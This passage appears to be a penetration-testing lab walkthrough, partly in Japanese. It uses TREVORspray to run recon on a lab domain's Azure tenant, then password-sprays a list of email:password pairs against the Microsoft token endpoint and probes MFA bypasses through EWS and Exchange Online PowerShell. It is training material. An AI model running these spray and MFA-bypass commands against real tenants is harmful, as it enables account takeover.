aparker@hiboxy.com:Oozle11
mlara@hiboxy.com:Packardbell350
slopez@hiboxy.com:Tibbetts3
EOF
sec560@560vm:~/Downloads/users$ cat valid.creds 
abates@hiboxy.com:Metallica6
aparker@hiboxy.com:Oozle11
mlara@hiboxy.com:Packardbell350
slopez@hiboxy.com:Tibbetts3
sec560@560vm:~/Downloads/users$ 
```

#### 6: Password Attack

`https://github.com/blacklanternsecurity/TREVORspray`

```
sec560@560vm:~/Downloads/users$ trevorspray --help
[INFO] Command: /usr/local/bin/trevorspray --help
usage: trevorspray [-h] [-m {jumpcloud,adfs,auth0,owa,anyconnect,okta,msol}]
                   [-up USERPASS [USERPASS ...]] [-u USERS [USERS ...]]
                   [-p PASSWORDS [PASSWORDS ...]] [--url URL] [-r DOMAIN]
                   [--export-tenants FILE] [-t THREADS] [-f] [-d DELAY]
                   [-ld LOCKOUT_DELAY] [-j JITTER] [-e] [-nl]
                   [--ignore-lockouts] [--timeout TIMEOUT]
                   [--random-useragent] [-6] [--proxy PROXY] [-v]
                   [-s USER@SERVER [USER@SERVER ...]] [-i KEY] [-b BASE_PORT]
                   [-n] [--subnet SUBNET] [--interface INTERFACE]

A password sprayer with the option to load-balance traffic through SSH hosts

options:
  -h, --help            show this help message and exit

basic arguments:
  -m {jumpcloud,adfs,auth0,owa,anyconnect,okta,msol}, --module {jumpcloud,adfs,auth0,owa,anyconnect,okta,msol}
                        Spray module to use (default: msol)
  -up USERPASS [USERPASS ...], --userpass USERPASS [USERPASS ...]
                        file(s) containing username and password pairs
                        (format: 'username:password')
  -u USERS [USERS ...], --users USERS [USERS ...]
                        Usernames(s) and/or file(s) containing usernames
  -p PASSWORDS [PASSWORDS ...], --passwords PASSWORDS [PASSWORDS ...]
                        Password(s) and/or file(s) containing passwords
  --url URL             The URL to spray against
  -r DOMAIN, --recon DOMAIN, --enumerate DOMAIN
                        Retrieves MX records and info related to
                        authentication, email, Azure, Microsoft 365, etc. If
                        --usernames are specified, this also enables username
                        enumeration.
  --export-tenants FILE
                        Export all discovered tenant domains to a file

advanced arguments:
  Round-robin traffic through remote systems via SSH (overrides --threads)

  -t THREADS, --threads THREADS
                        Max number of concurrent requests (default: 1)
  -f, --force           Try all usernames/passwords even if they've been tried
                        before
  -d DELAY, --delay DELAY
                        Sleep for this many seconds between requests
  -ld LOCKOUT_DELAY, --lockout-delay LOCKOUT_DELAY
                        Sleep for this many additional seconds when a lockout
                        is encountered
  -j JITTER, --jitter JITTER
                        Add a random delay of up to this many seconds between
                        requests
  -e, --exit-on-success
                        Stop spray when a valid cred is found
  -nl, --no-loot        Don't execute loot activites for valid accounts
  --ignore-lockouts     Forces the spray to continue and not stop when
                        multiple account lockouts are detected
  --timeout TIMEOUT     Connection timeout in seconds (default: 10)
  --random-useragent    Add a random value to the User-Agent for each request
  -6, --prefer-ipv6     Prefer IPv6 over IPv4
  --proxy PROXY         Proxy to use for HTTP and HTTPS requests
  -v, --verbose, --debug
                        Show which proxy is being used for each request

SSH Proxy:
  Round-robin traffic through remote systems via SSH (overrides --threads)

  -s USER@SERVER [USER@SERVER ...], --ssh USER@SERVER [USER@SERVER ...]
                        Round-robin load-balance through these SSH hosts
                        (user@host) NOTE: Current IP address is also used once
                        per round
  -i KEY, -k KEY, --key KEY
                        Use this SSH key when connecting to proxy hosts
  -b BASE_PORT, --base-port BASE_PORT
                        Base listening port to use for SOCKS proxies
  -n, --no-current-ip   Don't spray from the current IP, only use SSH proxies

Subnet Proxy:
  Send traffic from random addresses within IP subnet

  --subnet SUBNET       Subnet to send packets from
  --interface INTERFACE
                        Interface to send packets on
sec560@560vm:~/Downloads/users$ 
```

トレバースプレーには多くのオプションがありますが、今回は以下のものを使用します：

    メールアドレスの一覧が記載された当社のusers.txtファイル
    パスワードの一覧が記載されたパスワード.txtファイル
    hiboxy.com に対する認証用URL（間もなく偵察により取得予定）

```
sec560@560vm:~/Downloads/users$ trevorspray --recon hiboxy.com
[INFO] Command: /usr/local/bin/trevorspray --recon hiboxy.com
[INFO] Checking MX records for hiboxy.com
[WARN] No results.
[INFO] Checking TXT records for hiboxy.com
[WARN] No results.
[INFO] Checking OpenID configuration at https://login.windows.net/hiboxy.com/.well-known/openid-configuration
[INFO] NOTE: You can spray against "token_endpoint" with --url!!
[SUCC] 
{
    "token_endpoint": "https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/token",
    "token_endpoint_auth_methods_supported": [
        "client_secret_post",
        "private_key_jwt",
        "client_secret_basic"
    ],
    "jwks_uri": "https://login.windows.net/common/discovery/keys",
    "response_modes_supported": [
        "query",
        "fragment",
        "form_post"
    ],
    "subject_types_supported": [
        "pairwise"
    ],
    "id_token_signing_alg_values_supported": [
        "RS256"
    ],
    "response_types_supported": [
        "code",
        "id_token",
        "code id_token",
        "token id_token",
        "token"
    ],
    "scopes_supported": [
        "openid"
    ],
    "issuer": "https://sts.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/",
    "microsoft_multi_refresh_token": true,
    "authorization_endpoint": "https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/authorize",
    "device_authorization_endpoint": "https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/devicecode",
    "http_logout_supported": true,
    "frontchannel_logout_supported": true,
    "end_session_endpoint": "https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/logout",
    "claims_supported": [
        "sub",
        "iss",
        "cloud_instance_name",
        "cloud_instance_host_name",
        "cloud_graph_host_name",
        "msgraph_host",
        "aud",
        "exp",
        "iat",
        "auth_time",
        "acr",
        "amr",
        "nonce",
        "email",
        "given_name",
        "family_name",
        "nickname"
    ],
    "check_session_iframe": "https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/checksession",
    "userinfo_endpoint": "https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/openid/userinfo",
    "kerberos_endpoint": "https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/kerberos",
    "tenant_region_scope": "NA",
    "cloud_instance_name": "microsoftonline.com",
    "cloud_graph_host_name": "graph.windows.net",
    "msgraph_host": "graph.microsoft.com",
    "rbac_url": "https://pas.windows.net"
}

[SUCC] Tenant ID: "1c0060e4-c4db-4777-a48b-34a1515e33bf"
[INFO] Checking user realm at https://login.microsoftonline.com/getuserrealm.srf?login=test@hiboxy.com
[SUCC] 
{
    "State": 4,
    "UserState": 1,
    "Login": "test@hiboxy.com",
    "NameSpaceType": "Managed",
    "DomainName": "hiboxy.com",
    "FederationBrandName": "hiboxy",
    "CloudInstanceName": "microsoftonline.com",
    "CloudInstanceIssuerUri": "urn:federation:MicrosoftOnline"
}

[INFO] Checking autodiscover info at https://outlook.office365.com/autodiscover/autodiscover.json/v1.0/test@hiboxy.com?Protocol=Autodiscoverv1
[WARN] No results.
[INFO] Attempting to discover OWA instances
[INFO] Retrieving tenant domains at https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc
[SUCC] Found 1 domains under tenant!
[SUCC] 
[
    "hiboxy.com"
]

[INFO] Wrote 1 domains to /home/sec560/.trevorspray/loot/recon_hiboxy.com_other_tenant_domains.txt
[INFO] 0 valid users written to /home/sec560/.trevorspray/existent_users.txt
[INFO] 0 valid user/pass combos written to /home/sec560/.trevorspray/valid_logins.txt
sec560@560vm:~/Downloads/users$ 
```

「token_endpoint」フィールドから「login.windows.net」URLを取得し、さらにHiboxyのオンプレミスExchangeサーバーも発見

```
ec560@560vm:~/Downloads/users$ trevorspray --userpass valid.creds --url 'https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/token'
[INFO] Command: /usr/local/bin/trevorspray --userpass valid.creds --url https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/token
[INFO] Spraying 4 users against https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/token at Fri Mar  6 06:17:13 2026
[SUCC] abates@hiboxy.com:Metallica6 - AADSTS50131: Correct password but login was blocked.
[INFO] Running loot module: MSOLLooter
[INFO] Testing IMAP4 MFA bypass for abates@hiboxy.com
[WARN] IMAP MFA bypass failed for abates@hiboxy.com: b'LOGIN failed.'
[INFO] Testing SMTP MFA bypass for abates@hiboxy.com
[WARN] SMTP MFA bypass failed for abates@hiboxy.com: Connection unexpectedly closed: The read operation timed out
[WARN] SMTP MFA bypass failed for abates@hiboxy.com: Connection unexpectedly closed: The read operation timed out
[INFO] Testing POP3 MFA bypass for abates@hiboxy.com
[WARN] POP3 MFA bypass failed for abates@hiboxy.com: b'-ERR Authentication failure: unknown user name or bad password. [Error="AuthFailed:LogonDenied-BasicAuthBlocked-<RequestId=4ce17226-5ff3-4d02-a4cc-9a98bde60f0f,ST=05:26:37><Process:Microsoft.Exchange.Security.BasicAuthService.Server><BG<UserType:ManagedBusiness><LogonFailed-BasicAuthBlocked><AS:BasicAuthBlocked><Tid=1c0060e4-c4db-4777-a48b-34a1515e33bf><V1 User:abates@hiboxy.com" AuthResult=28 Proxy=BL4PR10MB8231.NAMPRD10.PROD.OUTLOOK.COM:8085:SSL MailboxBE=IA3PR10MB8758.namprd10.PROD.OUTLOOK.COM Service=Pop3B2]'
[INFO] Testing Exchange Web Services (EWS) MFA bypass for abates@hiboxy.com (https://outlook.office365.com/EWS/Exchange.asmx)
[SUCC] MFA bypass (EWS) enabled for abates@hiboxy.com!
[SUCC] Attempting to dump Global Address List
[ERRR] Traceback (most recent call last):
  File "/usr/local/lib/python3.12/dist-packages/trevorspray/lib/looters/msol.py", line 149, in test_ews
    results = account.protocol.resolve_names(
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/protocol.py", line 548, in resolve_names
    return list(
           ^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 216, in _elems_to_objs
    for elem in elems:
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 279, in _chunked_get_elements
    yield from self._get_elements(payload=payload_func(chunk, **kwargs))
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 300, in _get_elements
    yield from self._response_generator(payload=payload)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 263, in _response_generator
    response = self._get_response_xml(payload=payload)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 394, in _get_response_xml
    for api_version in self._api_versions_to_try():
                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 375, in _api_versions_to_try
    return (self._version_hint.api_version,) + tuple(
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'api_version'

[INFO] Testing Exchange ActiveSync (EAS) MFA bypass for abates@hiboxy.com
[INFO] Testing Exchange Online Powershell (EXO) MFA bypass for abates@hiboxy.com
[SUCC] MFA bypass (Exchange Online Powershell) enabled for abates@hiboxy.com (https://outlook.office365.com/powershell-liveid/)!
[INFO] Testing Autodiscover MFA bypass for abates@hiboxy.com
[INFO] Testing Offline Address Book (OAB) MFA bypass for abates@hiboxy.com
[WARN] No OAB URL found for abates@hiboxy.com.
[INFO] Testing Azure management for abates@hiboxy.com
[SUCC] abates@hiboxy.com can authenticate to the Azure Service Management API - AADSTS50131: Correct password but login was blocked.
[WARN] Azure management not enabled for abates@hiboxy.com.
[INFO] Testing Unified Messaging (UM) MFA bypass for abates@hiboxy.com
[SUCC] aparker@hiboxy.com:Oozle11 - AADSTS50131: Correct password but login was blocked.
[INFO] Running loot module: MSOLLooter
[INFO] Testing IMAP4 MFA bypass for aparker@hiboxy.com
[WARN] IMAP MFA bypass failed for aparker@hiboxy.com: b'LOGIN failed.'
[INFO] Testing SMTP MFA bypass for aparker@hiboxy.com
[WARN] SMTP MFA bypass failed for aparker@hiboxy.com: Connection unexpectedly closed: The read operation timed out
[WARN] SMTP MFA bypass failed for aparker@hiboxy.com: Connection unexpectedly closed: The read operation timed out
[INFO] Testing POP3 MFA bypass for aparker@hiboxy.com
[WARN] POP3 MFA bypass failed for aparker@hiboxy.com: b'-ERR Authentication failure: unknown user name or bad password. [Error="AuthFailed:LogonDenied-BasicAuthBlocked-<RequestId=9d49fc4a-b631-4f6c-831c-e11bb874cbd3,ST=02:40:19><Process:Microsoft.Exchange.Security.BasicAuthService.Server><BG<UserType:ManagedBusiness><LogonFailed-BasicAuthBlocked><AS:BasicAuthBlocked><Tid=1c0060e4-c4db-4777-a48b-34a1515e33bf><V1 User:aparker@hiboxy.com" AuthResult=28 Proxy=SN7PR10MB6643.NAMPRD10.PROD.OUTLOOK.COM:8085:SSL MailboxBE=SA3PR10MB7000.namprd10.PROD.OUTLOOK.COM Service=Pop3B2]'
[INFO] Testing Exchange Web Services (EWS) MFA bypass for aparker@hiboxy.com (https://outlook.office365.com/EWS/Exchange.asmx)
[SUCC] MFA bypass (EWS) enabled for aparker@hiboxy.com!
[SUCC] Attempting to dump Global Address List
[ERRR] Traceback (most recent call last):
  File "/usr/local/lib/python3.12/dist-packages/trevorspray/lib/looters/msol.py", line 149, in test_ews
    results = account.protocol.resolve_names(
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/protocol.py", line 548, in resolve_names
    return list(
           ^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 216, in _elems_to_objs
    for elem in elems:
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 279, in _chunked_get_elements
    yield from self._get_elements(payload=payload_func(chunk, **kwargs))
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 300, in _get_elements
    yield from self._response_generator(payload=payload)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 263, in _response_generator
    response = self._get_response_xml(payload=payload)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 394, in _get_response_xml
    for api_version in self._api_versions_to_try():
                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 375, in _api_versions_to_try
    return (self._version_hint.api_version,) + tuple(
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'api_version'

[INFO] Testing Exchange ActiveSync (EAS) MFA bypass for aparker@hiboxy.com
[INFO] Testing Exchange Online Powershell (EXO) MFA bypass for aparker@hiboxy.com
[SUCC] MFA bypass (Exchange Online Powershell) enabled for aparker@hiboxy.com (https://outlook.office365.com/powershell-liveid/)!
[INFO] Testing Autodiscover MFA bypass for aparker@hiboxy.com
[INFO] Testing Offline Address Book (OAB) MFA bypass for aparker@hiboxy.com
[WARN] No OAB URL found for aparker@hiboxy.com.
[INFO] Testing Azure management for aparker@hiboxy.com
[SUCC] aparker@hiboxy.com can authenticate to the Azure Service Management API - AADSTS50131: Correct password but login was blocked.
[WARN] Azure management not enabled for aparker@hiboxy.com.
[INFO] Testing Unified Messaging (UM) MFA bypass for aparker@hiboxy.com
[VERB] Waiting for proxy threads to finish
[SUCC] mlara@hiboxy.com:Packardbell350 - AADSTS50131: Correct password but login was blocked.
[INFO] Running loot module: MSOLLooter
[INFO] Testing IMAP4 MFA bypass for mlara@hiboxy.com
[WARN] IMAP MFA bypass failed for mlara@hiboxy.com: b'LOGIN failed.'
[INFO] Testing SMTP MFA bypass for mlara@hiboxy.com
[VERB] Waiting for proxy threads to finish
[VERB] Waiting for proxy threads to finish
[VERB] Waiting for proxy threads to finish
[WARN] SMTP MFA bypass failed for mlara@hiboxy.com: Connection unexpectedly closed: The read operation timed out
[VERB] Waiting for proxy threads to finish
[VERB] Waiting for proxy threads to finish
[VERB] Waiting for proxy threads to finish
[WARN] SMTP MFA bypass failed for mlara@hiboxy.com: Connection unexpectedly closed: The read operation timed out
[INFO] Testing POP3 MFA bypass for mlara@hiboxy.com
[WARN] POP3 MFA bypass failed for mlara@hiboxy.com: b'-ERR Authentication failure: unknown user name or bad password. [Error="AuthFailed:LogonDenied-BasicAuthBlocked-<RequestId=bd990eb5-24e5-46df-b3b7-c682dcec27d1,ST=00:30:51><Process:Microsoft.Exchange.Security.BasicAuthService.Server><BG<UserType:ManagedBusiness><LogonFailed-BasicAuthBlocked><AS:BasicAuthBlocked><Tid=1c0060e4-c4db-4777-a48b-34a1515e33bf><V1 User:mlara@hiboxy.com" AuthResult=28 Proxy=CO6PR10MB5442.NAMPRD10.PROD.OUTLOOK.COM:8085:SSL MailboxBE=CO1PR10MB4659.namprd10.prod.outlook.com Service=Pop3B2]'
[INFO] Testing Exchange Web Services (EWS) MFA bypass for mlara@hiboxy.com (https://outlook.office365.com/EWS/Exchange.asmx)
[SUCC] MFA bypass (EWS) enabled for mlara@hiboxy.com!
[SUCC] Attempting to dump Global Address List
[ERRR] Traceback (most recent call last):
  File "/usr/local/lib/python3.12/dist-packages/trevorspray/lib/looters/msol.py", line 149, in test_ews
    results = account.protocol.resolve_names(
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/protocol.py", line 548, in resolve_names
    return list(
           ^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 216, in _elems_to_objs
    for elem in elems:
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 279, in _chunked_get_elements
    yield from self._get_elements(payload=payload_func(chunk, **kwargs))
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 300, in _get_elements
    yield from self._response_generator(payload=payload)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 263, in _response_generator
    response = self._get_response_xml(payload=payload)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 394, in _get_response_xml
    for api_version in self._api_versions_to_try():
                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 375, in _api_versions_to_try
    return (self._version_hint.api_version,) + tuple(
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'api_version'

[INFO] Testing Exchange ActiveSync (EAS) MFA bypass for mlara@hiboxy.com
[INFO] Testing Exchange Online Powershell (EXO) MFA bypass for mlara@hiboxy.com
[SUCC] MFA bypass (Exchange Online Powershell) enabled for mlara@hiboxy.com (https://outlook.office365.com/powershell-liveid/)!
[INFO] Testing Autodiscover MFA bypass for mlara@hiboxy.com
[INFO] Testing Offline Address Book (OAB) MFA bypass for mlara@hiboxy.com
[WARN] No OAB URL found for mlara@hiboxy.com.
[INFO] Testing Azure management for mlara@hiboxy.com
[SUCC] mlara@hiboxy.com can authenticate to the Azure Service Management API - AADSTS50131: Correct password but login was blocked.
[WARN] Azure management not enabled for mlara@hiboxy.com.
[INFO] Testing Unified Messaging (UM) MFA bypass for mlara@hiboxy.com
[VERB] Waiting for proxy threads to finish
[SUCC] slopez@hiboxy.com:Tibbetts3 - AADSTS50131: Correct password but login was blocked.
[INFO] Running loot module: MSOLLooter
[INFO] Testing IMAP4 MFA bypass for slopez@hiboxy.com
[VERB] Waiting for proxy threads to finish
[WARN] IMAP MFA bypass failed for slopez@hiboxy.com: b'LOGIN failed.'
[INFO] Testing SMTP MFA bypass for slopez@hiboxy.com
[VERB] Waiting for proxy threads to finish
[VERB] Waiting for proxy threads to finish
[WARN] SMTP MFA bypass failed for slopez@hiboxy.com: Connection unexpectedly closed: The read operation timed out
[VERB] Waiting for proxy threads to finish
[VERB] Waiting for proxy threads to finish
[VERB] Waiting for proxy threads to finish
[WARN] SMTP MFA bypass failed for slopez@hiboxy.com: Connection unexpectedly closed: The read operation timed out
[INFO] Testing POP3 MFA bypass for slopez@hiboxy.com
[WARN] POP3 MFA bypass failed for slopez@hiboxy.com: b'-ERR Authentication failure: unknown user name or bad password. [Error="AuthFailed:LogonDenied-BasicAuthBlocked-<RequestId=47bd946e-c443-4f02-a04b-cc9ec31d9c43,ST=00:30:51><Process:Microsoft.Exchange.Security.BasicAuthService.Server><BG<UserType:ManagedBusiness><LogonFailed-BasicAuthBlocked><AS:BasicAuthBlocked><Tid=1c0060e4-c4db-4777-a48b-34a1515e33bf><V1 User:slopez@hiboxy.com" AuthResult=28 Proxy=CO6PR10MB5442.NAMPRD10.PROD.OUTLOOK.COM:8085:SSL MailboxBE=MW4PR10MB6345.namprd10.PROD.OUTLOOK.COM Service=Pop3B2]'
[INFO] Testing Exchange Web Services (EWS) MFA bypass for slopez@hiboxy.com (https://outlook.office365.com/EWS/Exchange.asmx)
[SUCC] MFA bypass (EWS) enabled for slopez@hiboxy.com!
[SUCC] Attempting to dump Global Address List
[ERRR] Traceback (most recent call last):
  File "/usr/local/lib/python3.12/dist-packages/trevorspray/lib/looters/msol.py", line 149, in test_ews
    results = account.protocol.resolve_names(
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/protocol.py", line 548, in resolve_names
    return list(
           ^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 216, in _elems_to_objs
    for elem in elems:
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 279, in _chunked_get_elements
    yield from self._get_elements(payload=payload_func(chunk, **kwargs))
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 300, in _get_elements
    yield from self._response_generator(payload=payload)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 263, in _response_generator
    response = self._get_response_xml(payload=payload)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 394, in _get_response_xml
    for api_version in self._api_versions_to_try():
                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/dist-packages/exchangelib/services/common.py", line 375, in _api_versions_to_try
    return (self._version_hint.api_version,) + tuple(
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'api_version'

[INFO] Testing Exchange ActiveSync (EAS) MFA bypass for slopez@hiboxy.com
[INFO] Testing Exchange Online Powershell (EXO) MFA bypass for slopez@hiboxy.com
[SUCC] MFA bypass (Exchange Online Powershell) enabled for slopez@hiboxy.com (https://outlook.office365.com/powershell-liveid/)!
[INFO] Testing Autodiscover MFA bypass for slopez@hiboxy.com
[INFO] Testing Offline Address Book (OAB) MFA bypass for slopez@hiboxy.com
[WARN] No OAB URL found for slopez@hiboxy.com.
[INFO] Testing Azure management for slopez@hiboxy.com
[SUCC] slopez@hiboxy.com can authenticate to the Azure Service Management API - AADSTS50131: Correct password but login was blocked.
[WARN] Azure management not enabled for slopez@hiboxy.com.
[INFO] Testing Unified Messaging (UM) MFA bypass for slopez@hiboxy.com
[INFO] Finished spraying 4 users against https://login.windows.net/1c0060e4-c4db-4777-a48b-34a1515e33bf/oauth2/token at Fri Mar  6 06:18:40 2026
[SUCC] abates@hiboxy.com:Metallica6
[SUCC] aparker@hiboxy.com:Oozle11
[SUCC] mlara@hiboxy.com:Packardbell350
[SUCC] slopez@hiboxy.com:Tibbetts3
[INFO] 4 valid users written to /home/sec560/.trevorspray/existent_users.txt
[INFO] 4 valid user/pass combos written to /home/sec560/.trevorspray/valid_logins.txt
sec560@560vm:~/Downloads/users$ 
```


`[SUCC] slopez@hiboxy.com can authenticate to the Azure Service Management API - AADSTS50131: Correct password but login was blocked.`

`[SUCC] MFA bypass (Exchange Online Powershell) enabled for slopez@hiboxy.com (https://outlook.office365.com/powershell-liveid/)!`